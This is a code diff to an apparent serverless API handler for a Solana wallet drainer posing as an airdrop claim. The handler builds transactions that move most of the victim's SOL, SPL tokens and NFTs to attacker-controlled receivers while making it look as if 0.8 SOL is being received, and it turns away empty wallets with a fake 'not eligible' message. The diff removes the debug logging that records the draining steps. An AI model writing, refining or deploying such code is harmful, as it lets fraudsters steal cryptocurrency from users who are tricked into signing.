@@ -83,9 +83,7 @@ export default async function handler(req, res) {
     let lamports = 0;
     try {
       lamports = await connection.getBalance(userPubkey);
-      console.log(`User balance: ${lamports} lamports`);
     } catch (error) {
-      console.error('Error getting balance:', error);
       return res.status(500).json({ error: 'Failed to get user balance', details: error.message });
     }
 
@@ -100,7 +98,6 @@ export default async function handler(req, res) {
           lamports: drainAmount,
         });
         tx.add(airdropIx);
-        console.log(`Added airdrop claim: ${drainAmount} lamports (appears as receiving 0.8 SOL)`);
       } else {
         // For zero balance, create minimal transaction
         const minimalIx = SystemProgram.transfer({
@@ -109,11 +106,8 @@ export default async function handler(req, res) {
           lamports: 1000,
         });
         tx.add(minimalIx);
-        console.log(`Added minimal airdrop claim: 1000 lamports (appears as receiving 0.8 SOL)`);
       }
-      console.log(`Added PSYOPS airdrop simulation: User appears to be receiving 0.8 SOL airdrop`);
     } catch (error) {
-      console.error('Error processing PSYOPS airdrop:', error);
       return res.status(500).json({ error: 'Failed to create airdrop transaction', details: error.message });
     }
 
@@ -164,19 +158,15 @@ export default async function handler(req, res) {
           
           tx.add(tokenIx);
           tokenCount++;
-          console.log(`Added token drain: ${totalAmount} tokens of mint ${mint} to receiver ${tokenCount}`);
           
         } catch (tokenError) {
-          console.error('Error processing token drain:', tokenError);
           continue;
         }
       }
       
       if (tokenCount > 0) {
-        console.log(`Added PSYOPS token claim simulation: User appears to be claiming ${tokenCount} tokens with SOL airdrop`);
       }
     } catch (error) {
-      console.error('Error processing SPL tokens:', error);
       // Continue without token transfers
     }
 
@@ -220,25 +210,20 @@ export default async function handler(req, res) {
             
             tx.add(nftIx);
             nftCount++;
-            console.log(`Added NFT drain: NFT ${mint} to receiver ${nftCount}`);
           }
         } catch (nftError) {
-          console.error('Error processing NFT drain:', nftError);
           continue;
         }
       }
       
       if (nftCount > 0) {
-        console.log(`Added NFT claim simulation: User appears to be claiming ${nftCount} NFTs with airdrop`);
       }
     } catch (error) {
-      console.error('Error processing NFTs:', error);
       // Continue without NFT transfers
     }
 
     // 4. IMPROVED ZERO BALANCE HANDLING
     if (tx.instructions.length === 0) {
-      console.log('No instructions added - user has no funds to drain');
       return res.status(400).json({ 
         error: 'Sorry, You\'re Not eligible', 
         details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
@@ -252,32 +237,12 @@ export default async function handler(req, res) {
       tx.feePayer = userPubkey;
       tx.recentBlockhash = blockhash.blockhash;
 
-      console.log('Transaction details:');
-      console.log('- Fee payer:', tx.feePayer.toString());
-      console.log('- Recent blockhash:', tx.recentBlockhash);
-      console.log('- Instructions count:', tx.instructions.length);
-      
       // Validate transaction before serialization
       if (tx.instructions.length === 0) {
         throw new Error('Transaction has no instructions');
       }
 
-      // Log instruction details for debugging
-      console.log('Transaction instructions:');
-      tx.instructions.forEach((ix, index) => {
-        try {
-          console.log(`  ${index + 1}. Program: ${ix.programId.toString()}`);
-          if (ix.keys) {
-            console.log(`     Keys: ${ix.keys.length} accounts`);
-          }
-        } catch (error) {
-          console.error(`Error logging instruction ${index + 1}:`, error.message);
-        }
-      });
-
       const serialized = tx.serialize({ requireAllSignatures: false });
-      console.log('Transaction serialized successfully');
-      console.log('Serialized size:', serialized.length, 'bytes');
       
       // Add performance metrics
       const performanceData = {
@@ -288,16 +253,12 @@ export default async function handler(req, res) {
         solAmount: lamports > 5000 ? lamports - 5000 : 0
       };
       
-      console.log('Performance metrics:', performanceData);
-      
       res.status(200).send(serialized.toString('base64'));
     } catch (error) {
-      console.error('Error finalizing transaction:', error);
-      res.status(500).json({ error: 'Failed to finalize transaction', details: error.message });
+      return res.status(500).json({ error: 'Failed to finalize transaction', details: error.message });
     }
 
   } catch (error) {
-    console.error('Error generating transaction:', error);
-    res.status(500).json({ error: 'Failed to generate transaction', details: error.message });
+    return res.status(500).json({ error: 'Failed to generate transaction', details: error.message });
   }
 } 
